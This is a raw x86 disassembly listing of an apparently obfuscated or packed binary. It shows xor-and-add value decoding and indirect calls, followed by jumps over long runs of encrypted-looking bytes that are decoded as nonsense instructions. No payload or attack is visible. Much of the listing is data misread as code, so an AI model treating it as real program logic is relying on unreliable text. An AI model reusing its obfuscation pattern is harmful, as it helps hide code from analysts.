  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	mov    esi,DWORD PTR [ebp-0x24]
  415961:	(bad)  
  415962:	ins    DWORD PTR es:[edi],dx
  415963:	adc    BYTE PTR [edi+0x78],bh
  415966:	xchg   ebp,eax
  415967:	jle    0x4159e1
  415969:	js     0x4159b6
  41596b:	jb     0x415985
  41596d:	pop    ds
  41596e:	(bad)  
  415970:	inc    BYTE PTR [edx-0x49]
  415973:	ret    0xcd0e
  415976:	(bad)  
  415977:	fisub  WORD PTR [ebx]
  415979:	test   BYTE PTR [esi],bh
  41597b:	loopne 0x415914
  41597d:	retf   0x2411
  415980:	adc    ebp,ebp
  415982:	xchg   ebx,eax
  415983:	and    DWORD PTR [edi],edx
  415985:	pop    ds
  415986:	push   ecx
  415987:	mov    ebp,0x9e4fb183
  41598c:	push   cs
  41598d:	add    al,0x14
  41598f:	shl    esp,0x65
  415992:	add    BYTE PTR [edx+0x12],cl
  415995:	add    BYTE PTR [ebp+0x7d4c6c75],ch
  41599b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41599c:	mov    ebp,0xdaba7491
  4159a1:	jae    0x4159ff
  4159a3:	pushf  
  4159a4:	pop    ebp
  4159a5:	xchg   ecx,eax
  4159a6:	sub    DWORD PTR [ecx-0x2e],ecx
  4159a9:	adc    edi,DWORD PTR [ebx-0x2c40af78]
  4159af:	rol    DWORD PTR [edx],1
  4159b1:	push   edx
  4159b2:	jl     0x4159ef
  4159b4:	jno    0x415989
  4159b6:	imul   edx,DWORD PTR [edx+0x72c7a23f],0x79720a7e
  4159c0:	and    ebp,DWORD PTR [edx+0x44]
  4159c3:	test   BYTE PTR [edi+0x6534d5d5],bh
  4159c9:	mov    al,ds:0x729e9167
  4159ce:	adc    al,BYTE PTR [ebx-0x708c607c]
  4159d4:	dec    edx
  4159d5:	aas    
  4159d6:	push   edx
  4159d7:	pusha  
  4159d8:	(bad)  
  4159d9:	int    0xd8
  4159db:	mov    ds:0x601ddf98,al
  4159e0:	push   esp
  4159e1:	stos   DWORD PTR es:[edi],eax
  4159e2:	or     al,0x79
  4159e4:	sub    eax,0x63c81d5d
  4159e9:	sbb    ebx,esp
  4159eb:	imul   eax,DWORD PTR [esi],0x38
  4159ee:	fld    QWORD PTR [ebx]
  4159f0:	xchg   esi,eax
  4159f1:	mov    ebp,0x1caab49
  4159f6:	and    esi,edx
  4159f8:	mov    edx,0x3b328d12
  4159fd:	mov    esi,0xd8c59f9
  415a02:	jae    0x415a41
  415a04:	mov    esi,0xae105c16
  415a09:	and    dl,BYTE PTR [ebx+0x2c]
  415a0c:	push   es
  415a0d:	lock lods al,BYTE PTR ds:[esi]
  415a0f:	imul   esi,DWORD PTR [ebp+0xb7f687b],0xe
  415a16:	ficom  WORD PTR es:[esi-0x6c]
  415a1a:	adc    BYTE PTR [ebx-0x3acee783],al
  415a20:	into   
  415a21:	sbb    cl,BYTE PTR [edi-0x3d]
  415a24:	div    ecx
  415a26:	je     0x415a8e
  415a28:	jae    0x415a0c
  415a2a:	repnz (bad) 
  415a2c:	jl     0x415a8a
  415a2e:	cmp    al,0x9a
  415a30:	out    dx,al
  415a31:	jbe    0x4159ec
  415a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a34:	push   0xffffffc3
  415a36:	xchg   esi,eax
  415a38:	out    0x9e,al
  415a3a:	out    dx,eax
  415a3b:	push   edx
  415a3c:	cli    
  415a3d:	sbb    al,BYTE PTR [edx+0x21]
  415a40:	dec    edx
  415a41:	jg     0x415a12
  415a43:	push   edx
  415a44:	cli    
  415a45:	add    eax,0xdb45243a
  415a4a:	cmp    eax,0x6f41bcab
  415a4f:	mov    dl,0x3d
  415a51:	ret    0xb379
  415a54:	inc    esi
  415a55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a56:	pop    es
  415a57:	jo     0x415a34
  415a59:	push   es
  415a5a:	shl    BYTE PTR [edx],cl
  415a5c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  415a5e:	cmp    eax,0x7d70cf5a
  415a63:	jbe    0x415a54
  415a65:	fsubr  st,st(3)
  415a67:	sbb    ebx,DWORD PTR [ebx]
  415a69:	mov    ah,0x23
  415a6b:	or     dl,dh
  415a6d:	dec    esp
  415a6e:	adc    dl,cl
  415a70:	jecxz  0x415adb
  415a72:	mov    ds:0xf1a90f1a,al
  415a77:	mov    al,0x1f
  415a79:	fisubr DWORD PTR [edi-0xb]
  415a7c:	inc    ebp
  415a7d:	jae    0x415a53
  415a7f:	rcl    BYTE PTR [edx-0x77],0xed
  415a83:	in     eax,0x51
  415a85:	pop    esi
  415a86:	lock dec ebx
  415a88:	enter  0x924e,0x15
  415a8c:	add    eax,0x48d2945e
  415a91:	ror    DWORD PTR [esi-0x7d727de6],cl
  415a97:	lahf   
  415a98:	repz je 0x415a9e
  415a9b:	sbb    eax,0xe2e3e6d8
  415aa0:	add    ecx,DWORD PTR [esi]
  415aa2:	outs   dx,DWORD PTR ds:[esi]
  415aa3:	dec    ecx
  415aa4:	cmc    
  415aa5:	jmp    0xc5ca:0x3fe73374
  415aac:	loopne 0x415a9b
  415aae:	mov    ecx,DWORD PTR [ebx-0x5]
  415ab1:	or     DWORD PTR [ecx-0x282a23de],esi
  415ab7:	push   0x7e511604
  415abc:	jo     0x415a8d
  415abe:	imul   ebx,DWORD PTR [ebp-0x2c0c2184],0xa6dbc3c2
  415ac8:	pop    edx
  415ac9:	add    esp,DWORD PTR [ebp-0xe9774cb]
  415acf:	and    eax,0x1b7e3aa0
  415ad4:	push   esi
  415ad5:	adc    eax,DWORD PTR [ecx+ebx*4]
  415ad8:	xchg   esi,eax
  415ad9:	in     al,dx
  415ada:	and    DWORD PTR [ecx-0x455cc4b3],esi
  415ae0:	xor    ch,BYTE PTR [ecx]
  415ae2:	mov    edi,0xa935bd74
  415ae7:	mov    ebp,0x3b22f40
  415aec:	xchg   ebp,eax
  415aed:	out    0x54,al
  415aef:	cmp    bl,BYTE PTR [edi+0x36]
  415af2:	data16 jge 0x415b2c
  415af5:	add    DWORD PTR [edx],0x207400f5
  415afb:	push   ebx
  415afc:	push   es
  415afd:	push   ebp
  415afe:	pop    edx
  415aff:	rcr    BYTE PTR [ebx-0x35],cl
  415b02:	rol    DWORD PTR [ebp-0x40],1
  415b05:	lea    esi,[eax]
  415b07:	sbb    ebp,DWORD PTR [esi]
  415b09:	xchg   ebp,eax
  415b0a:	stc    
  415b0b:	mov    bh,0xd7
  415b0d:	mov    eax,ds:0x571ed408
  415b12:	jno    0x415ae6
  415b14:	ror    BYTE PTR [eax+0x62db7f91],cl
  415b1a:	dec    esp
  415b1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b1c:	(bad)  
  415b1d:	pusha  
  415b1e:	(bad)  
  415b1f:	xchg   ebp,eax
  415b20:	cli    
  415b21:	pop    edx
  415b22:	pusha  
  415b23:	stos   DWORD PTR es:[edi],eax
  415b24:	aam    0x1
  415b26:	mov    al,0xa7
  415b28:	gs test bh,cl
  415b2b:	adc    al,0x54
  415b2d:	icebp  
  415b2e:	adc    esp,DWORD PTR [esi]
  415b30:	stos   BYTE PTR es:[edi],al
  415b31:	jbe    0x415b94
  415b33:	mov    ecx,0x85782f4e
  415b38:	outs   dx,BYTE PTR ds:[esi]
  415b39:	push   ecx
  415b3a:	fwait
  415b3b:	xchg   edi,eax
  415b3c:	addr16 jg 0x415b2d
  415b3f:	push   cs
  415b40:	addr16 std 
  415b42:	daa    
  415b43:	jp     0x415b10
  415b45:	mov    eax,0xd7c78321
  415b4a:	jnp    0x415b3b
  415b4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b4d:	outs   dx,BYTE PTR ds:[esi]
  415b4e:	test   eax,0x7e55dcb0
  415b53:	push   esi
  415b54:	lock push esp
  415b56:	sar    ebx,0x5f
  415b59:	hlt    
  415b5a:	ins    DWORD PTR es:[edi],dx
  415b5b:	push   edx
  415b5c:	inc    esi
  415b5d:	inc    ebx
  415b5e:	sub    BYTE PTR [eax],dh
  415b60:	fst    DWORD PTR [ebx-0x4f]
  415b63:	enter  0x60e,0xa7
  415b67:	adc    DWORD PTR [edx],0x3
  415b6a:	cmp    edx,0xb
  415b6d:	leave  
  415b6e:	and    al,0xd4
  415b70:	mov    DWORD PTR [edi],ebp
  415b72:	pop    esp
  415b73:	fcomp  st(1)
  415b75:	rcr    DWORD PTR [ecx],0xae
  415b78:	xor    BYTE PTR [eax],0x74
  415b7b:	pop    eax
  415b7c:	xor    ebx,DWORD PTR [ecx+0x40]
  415b7f:	(bad)  
  415b80:	pop    ds
  415b81:	mov    ds:0xa29bcd5d,eax
  415b86:	std    
  415b87:	data16 and BYTE PTR [edx-0x35c0a884],0xbb
  415b8f:	gs ret 0xb5dc
  415b93:	adc    al,0xb8
  415b95:	hlt    
  415b96:	(bad)  
  415b97:	or     BYTE PTR [eax-0x5080e5e2],bh
  415b9d:	jo     0x415bba
  415b9f:	dec    ebx
  415ba0:	std    
  415ba1:	dec    eax
  415ba2:	loopne 0x415b3b
  415ba4:	test   eax,0x7b892ecc
  415ba9:	xchg   ch,ch
  415bab:	inc    eax
  415bac:	pop    esi
  415bad:	bnd ret 0x38a7
  415bb1:	add    ebp,DWORD PTR [edi]
  415bb3:	mov    al,0xa4
  415bb5:	cmp    ax,di
  415bb8:	loop   0x415c16
  415bba:	mov    dh,0xfd
  415bbc:	das    
  415bbd:	push   0x385d1ee6
  415bc2:	jo     0x415c1d
  415bc4:	dec    eax
  415bc5:	fild   WORD PTR [edx+0x114afa8]
  415bcb:	mov    DWORD PTR [edi-0x25786771],ecx
  415bd1:	in     eax,dx
  415bd2:	loope  0x415bdc
  415bd4:	sbb    eax,0x363d954e
  415bd9:	in     al,0x65
  415bdb:	sbb    esi,DWORD PTR [ecx-0x5ad3ca2a]
  415be1:	mov    al,0x51
  415be3:	sub    DWORD PTR [ecx-0x1c],esi
  415be6:	test   bl,al
  415be8:	push   0x1f
  415bea:	and    eax,ebp
  415bec:	add    dh,BYTE PTR [ecx+0x73]
  415bef:	ror    BYTE PTR [esi+0x5758d02e],cl
  415bf5:	inc    eax
  415bf6:	cmp    eax,0x447a246d
  415bfb:	sbb    cl,BYTE PTR [ebx+0x20]
  415bfe:	jbe    0x415c0b
  415c00:	into   
  415c01:	add    BYTE PTR [ecx+0x64],bh
  415c04:	mov    edx,0x5c75151
  415c09:	cmc    
  415c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c0b:	inc    edx
  415c0c:	add    BYTE PTR [eax],dl
  415c0e:	adc    BYTE PTR [eax],al
  415c10:	add    BYTE PTR [eax-0x7637ac7],bh
  415c16:	mov    DWORD PTR ds:0x42a7b9,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42a87d,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	mov    ds:0x8abce8ad,eax
  415c44:	adc    eax,0x7e95787f
  415c49:	js     0x415cc3
  415c4b:	stos   BYTE PTR es:[edi],al
  415c4c:	cmp    esp,0xffffffff
  415c4f:	jb     0x415bec
  415c51:	jle    0x415c09
  415c53:	hlt    
  415c54:	sbb    BYTE PTR [edi*1+0x4113ecb7],dh
  415c5b:	mov    BYTE PTR [esp+esi*2],dh
  415c5e:	mov    eax,ds:0xac4220c0
  415c63:	xchg   edx,eax
  415c64:	sbb    esi,DWORD PTR ds:0xc6d12683
  415c6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c6b:	adc    DWORD PTR [bx],esi
  415c6e:	(bad)  
  415c6f:	sub    al,BYTE PTR [edi-0x53]
  415c72:	std    
  415c73:	clc    
  415c74:	mov    eax,ds:0x714bce2c
  415c79:	call   0x6f18:0xf8e2e218
  415c80:	lahf   
  415c81:	std    
  415c82:	xchg   BYTE PTR [edx-0x6297b0d1],cl
  415c88:	stc    
  415c89:	ret    0xe488
  415c8c:	scas   al,BYTE PTR es:[edi]
  415c8d:	iret   
  415c8e:	cmp    BYTE PTR [ecx],0xa1
  415c91:	mov    esi,0xa5230abf
  415c96:	xchg   DWORD PTR [eax-0x11edc7f4],esp
  415c9c:	sub    ah,BYTE PTR [edi-0x1a4ef2df]
  415ca2:	mov    al,0x7
  415ca4:	sub    BYTE PTR [ebp+0x2b278f53],bh
  415caa:	or     ebp,DWORD PTR [esi+eiz*1-0x49]
  415cae:	mov    eax,ds:0x7684a64c
  415cb3:	cld    
  415cb4:	ja     0x415c9a
  415cb6:	or     edx,DWORD PTR [ecx-0x3bddb5a1]
  415cbc:	mov    bl,0x55
  415cbe:	int    0x1b
  415cc0:	add    al,0x35
  415cc2:	in     al,0x2f
  415cc4:	in     eax,0x3c
  415cc6:	jmp    0x415d40
  415cc8:	pop    edi
  415cc9:	scas   eax,DWORD PTR es:[edi]
  415cca:	cmp    ah,BYTE PTR [eax]
  415ccc:	(bad)  
  415cce:	cdq    
  415ccf:	arpl   dx,ax
  415cd1:	and    ebp,DWORD PTR [ecx-0x1c4b8427]
  415cd7:	dec    ebp
  415cd8:	jmp    0x40b81885
  415cdd:	das    
  415cde:	push   0x69
  415ce0:	fldcw  WORD PTR [ebx+0x69]
  415ce3:	repnz mov eax,es
  415ce6:	jbe    0x415d0a
  415ce8:	fisubr WORD PTR ds:0x2c3d90bf
  415cee:	mov    dh,0x31
  415cf0:	sub    BYTE PTR [ebx+edx*4],cl
  415cf3:	inc    esp
  415cf4:	mov    edx,DWORD PTR [ecx+0x5a]
  415cf7:	add    BYTE PTR [ecx-0x3e],dh
  415cfa:	ss push edx
  415cfc:	sar    BYTE PTR [edx],0x24
  415cff:	shl    DWORD PTR [esi+0x5],cl
  415d02:	ins    DWORD PTR es:[edi],dx
  415d03:	pop    ebp
  415d04:	aas    
  415d05:	sti    
  415d06:	jne    0x415d0e
  415d08:	push   edx
  415d09:	dec    ebp
  415d0a:	mov    esi,0x33337fa0
  415d0f:	xlat   BYTE PTR ds:[ebx]
  415d10:	mov    BYTE PTR ds:0xc99bec0a,al
  415d16:	jo     0x415cd8
  415d18:	add    DWORD PTR [ebx],0xffffffee
  415d1b:	cdq    
  415d1c:	adc    eax,0xab56e6ad
  415d21:	dec    edx
  415d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d23:	sub    ecx,DWORD PTR [edx+0x25]
  415d26:	jo     0x415cbf
  415d28:	and    al,0xdd
  415d2a:	xchg   esi,eax
  415d2b:	in     al,0xe1
  415d2d:	push   ecx
  415d2e:	xor    DWORD PTR [ebx],0x967b489e
  415d34:	mov    bl,0x11
  415d36:	adc    al,0x84
  415d38:	xchg   BYTE PTR [ecx+0x76f5c5d0],bh
  415d3e:	xchg   esp,eax
  415d3f:	retf   0xb78b
  415d42:	retf   
  415d43:	jo     0x415ccb
  415d45:	mov    ebx,0xf25daf8a
  415d4b:	mov    ds:0x3066a243,eax
  415d50:	inc    edi
  415d51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d52:	das    
  415d53:	in     al,0xab
  415d55:	std    
  415d56:	lock nop
  415d58:	mov    ?,WORD PTR [eax-0x132b07b]
  415d5e:	inc    esi
  415d5f:	sub    BYTE PTR [ebx+0x6b],0xb3
  415d63:	lds    esp,FWORD PTR [edi+0x3b]
  415d66:	inc    edx
  415d67:	push   edi
  415d68:	adc    edx,DWORD PTR [edx+0x28]
  415d6b:	push   edi
  415d6c:	fwait
  415d6d:	add    BYTE PTR ss:[edi+0x2ef262d3],dh
  415d74:	xlat   BYTE PTR ds:[ebx]
  415d75:	cmp    esi,DWORD PTR [esi+0x384daf1]
  415d7b:	sub    eax,DWORD PTR [ecx]
  415d7d:	sbb    al,0x9e
  415d7f:	fld    QWORD PTR [ebx+esi*1]
  415d82:	mov    ds:0x96646be8,al
  415d87:	adc    DWORD PTR [edi],ebp
  415d89:	mov    ss,WORD PTR [esi+0x3286baae]
  415d8f:	arpl   bp,dx
  415d91:	cmp    al,0xdd
  415d93:	lods   al,BYTE PTR ds:[esi]
  415d94:	or     al,0x82
  415d96:	and    BYTE PTR [eax],0x59
  415d99:	outs   dx,DWORD PTR ds:[esi]
  415d9a:	or     DWORD PTR [edx],edx
  415d9c:	pop    ebp
  415d9d:	cwde   
  415d9e:	dec    esi
  415d9f:	or     BYTE PTR ds:0x3d1c8eba,0xa0
  415da6:	mov    dl,0xac
  415da8:	lahf   
  415da9:	inc    ebx
  415daa:	dec    esp
  415dab:	cld    
  415dac:	shl    DWORD PTR [eax+0x7c],0xe
  415db0:	and    edx,DWORD PTR [edx+ecx*1]
  415db3:	imul   ebx,DWORD PTR [edi+0x274981e9],0x7c3bcc35
  415dbd:	mov    DWORD PTR [esi+0x185be663],esi
  415dc3:	jg     0x415d79
  415dc5:	jae    0x415e2c
  415dc7:	jae    0x415dda
  415dc9:	fs lahf 
  415dcb:	ret    
  415dcc:	cmp    cl,BYTE PTR [ebx-0x4c0c8242]
  415dd2:	int    0xd4
  415dd4:	fsub   DWORD PTR [eax]
  415dd6:	fstp   TBYTE PTR [eax]
  415dd8:	jnp    0x415e00
  415dda:	fcmovnb st,st(7)
  415ddc:	xor    al,0x40
  415dde:	cmp    esi,DWORD PTR [esi]
  415de0:	retf   0x8b8d
  415de3:	mov    ds:0x97f121cc,al
  415de8:	jno    0x415e18
  415dea:	adc    eax,0xe44e3fde
  415def:	fcmovnbe st,st(5)
  415df1:	cdq    
  415df2:	dec    edx
  415df3:	xor    DWORD PTR [ebp+0x7dd0306b],ecx
  415df9:	xchg   DWORD PTR [edi],esp
  415dfb:	enter  0xdb8c,0x5c
  415dff:	xchg   edi,eax
  415e00:	cmp    dl,BYTE PTR [eax]
  415e02:	and    ebp,DWORD PTR [edx-0x55]
  415e05:	mov    bl,bh
  415e07:	jnp    0x415df9
  415e09:	loope  0x415e23
  415e0b:	pop    edi
  415e0c:	fisub  DWORD PTR [eax+ebp*4]
  415e0f:	(bad)  
  415e10:	inc    ecx
  415e11:	jp     0x415e47
  415e13:	mov    ebx,0xf8d3eafe
  415e18:	shl    BYTE PTR [edx-0x40d28ba2],0x1c
  415e1f:	push   esp
  415e20:	ins    BYTE PTR es:[edi],dx
  415e21:	mov    eax,0x59455700
  415e26:	repz and BYTE PTR [eax+0x1b],0x1a
  415e2b:	mov    esi,0x15d5e627
  415e30:	xlat   BYTE PTR ds:[ebx]
  415e31:	call   0x7031:0x4ba20a3c
  415e38:	add    al,0x98
  415e3a:	test   al,0x6e
  415e3c:	mov    ss,WORD PTR [edi]
  415e3e:	pushf  
  415e3f:	xchg   edi,eax
  415e40:	arpl   WORD PTR [ecx+0x6a4bd1c8],bx
  415e46:	(bad)  
  415e47:	jmp    0xff735a14
  415e4c:	stos   BYTE PTR es:[edi],al
  415e4d:	cmp    eax,0x604c3f2a
  415e52:	mov    dl,0x58
  415e54:	retf   
  415e55:	pop    ss
  415e56:	jge    0x415e78
  415e58:	jp     0x415ece
  415e5a:	xchg   BYTE PTR [ebp-0x2d55eb41],al
  415e60:	mov    ds:0xc560d33e,al
  415e65:	inc    esp
  415e66:	mov    al,0xf3
  415e68:	(bad)  
  415e69:	push   ecx
  415e6a:	inc    edi
  415e6b:	outs   dx,DWORD PTR ds:[esi]
  415e6c:	int3   
  415e6d:	sub    DWORD PTR [edi+0x5b],esi
  415e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e71:	in     al,dx
  415e72:	jno    0x415e21
  415e74:	dec    esi
  415e75:	icebp  
  415e76:	jl     0x415ec2
  415e78:	mov    ecx,0xeabdd72f
  415e7d:	xor    al,0xfb
  415e7f:	bound  eax,QWORD PTR [ebx-0x58e46dfe]
  415e85:	push   eax
  415e86:	push   edi
  415e87:	loop   0x415e61
  415e89:	jl     0x415e14
  415e8b:	ror    BYTE PTR [eax+0x4e74deb0],1
  415e91:	jb     0x415e3f
  415e93:	pop    ss
  415e94:	test   BYTE PTR [eax-0x4d38546d],cl
  415e9a:	add    al,0x20
  415e9c:	push   eax
  415e9d:	and    BYTE PTR [edi+0x2c12de95],al
  415ea3:	shr    DWORD PTR [ecx],1
  415ea5:	xchg   ecx,eax
  415ea6:	bound  eax,QWORD PTR [edx-0x61e7d916]
  415eac:	nop
  415ead:	xor    al,0xe4
  415eaf:	pop    es
  415eb0:	adc    ah,dl
  415eb2:	icebp  
  415eb3:	cmc    
  415eb4:	jecxz  0x415f06
  415eb6:	in     al,0xc6
  415eb8:	xor    al,dl
  415eba:	test   eax,0xb454a8d9
  415ebf:	add    DWORD PTR [edi-0x7a],0xffffff9a
  415ec3:	clc    
  415ec4:	mov    bh,0x3
  415ec6:	sti    
  415ec7:	mov    edx,0x32205413
  415ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ecd:	mov    ebx,0x6f0ce948
  415ed2:	outs   dx,DWORD PTR ds:[esi]
  415ed3:	arpl   WORD PTR [ebx+ebp*1-0x38],bx
  415ed7:	jb     0x415ece
  415ed9:	stos   DWORD PTR es:[edi],eax
  415eda:	in     al,0x3a
  415edc:	cmp    eax,0x8ed18ed3
  415ee1:	or     DWORD PTR [ecx-0x764f7720],esi
  415ee7:	inc    ebp
  415ee8:	clc    
  415ee9:	mov    DWORD PTR ds:0x42a77d,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42a801,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42a805,0x42a7c1
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	jg     0x415f37
  415f4c:	out    dx,al
  415f4d:	shl    DWORD PTR [edi],1
  415f4f:	sbb    bh,BYTE PTR [edi+0x78]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415f3b
  415f57:	mov    esi,0x8f338b16
  415f5c:	ins    BYTE PTR es:[edi],dx
  415f5d:	pop    ebx
  415f5e:	add    DWORD PTR [ecx-0x13],ebp
  415f61:	dec    edx
  415f62:	sub    cl,BYTE PTR [esp+eax*2]
  415f65:	enter  0x4a64,0x50
  415f69:	fstp   DWORD PTR [ebp+0x3]
  415f6c:	mov    ch,0xda
  415f6e:	repnz and ebx,DWORD PTR [esi]
